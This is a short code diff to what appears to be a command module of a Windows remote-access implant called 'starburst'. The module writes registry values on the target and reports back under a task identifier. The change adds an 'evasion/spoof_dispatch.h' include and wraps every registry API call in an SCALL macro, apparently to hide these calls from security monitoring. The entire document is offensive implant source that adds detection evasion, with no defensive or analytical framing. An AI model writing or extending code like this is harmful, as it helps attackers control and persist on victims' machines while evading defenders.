@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_REG_WRITE_VALUE
 
@@ -64,7 +65,7 @@ auto declfn starburst::cmd_reg_write_value(
 
     HKEY h_key = nullptr;
     DWORD disposition = 0;
-    LSTATUS status = inst.advapi32.RegCreateKeyExA(
+    LSTATUS status = (LSTATUS)SCALL( inst, advapi32.RegCreateKeyExA,
         hive, key_buf, 0, nullptr, REG_OPTION_NON_VOLATILE,
         KEY_SET_VALUE, nullptr, &h_key, &disposition );
     if ( status != ERROR_SUCCESS ) {
@@ -85,12 +86,12 @@ auto declfn starburst::cmd_reg_write_value(
         }
         data_ptr = reinterpret_cast<BYTE*>( &dw_val );
         data_size = sizeof(DWORD);
-        status = inst.advapi32.RegSetValueExA( h_key, name_buf, 0, reg_type, data_ptr, data_size );
+        status = (LSTATUS)SCALL( inst, advapi32.RegSetValueExA, h_key, name_buf, 0, reg_type, data_ptr, data_size );
     } else {
-        status = inst.advapi32.RegSetValueExA( h_key, name_buf, 0, reg_type, data_ptr, data_size + 1 );
+        status = (LSTATUS)SCALL( inst, advapi32.RegSetValueExA, h_key, name_buf, 0, reg_type, data_ptr, data_size + 1 );
     }
 
-    inst.advapi32.RegCloseKey( h_key );
+    SCALL( inst, advapi32.RegCloseKey, h_key );
 
     if ( status == ERROR_SUCCESS ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
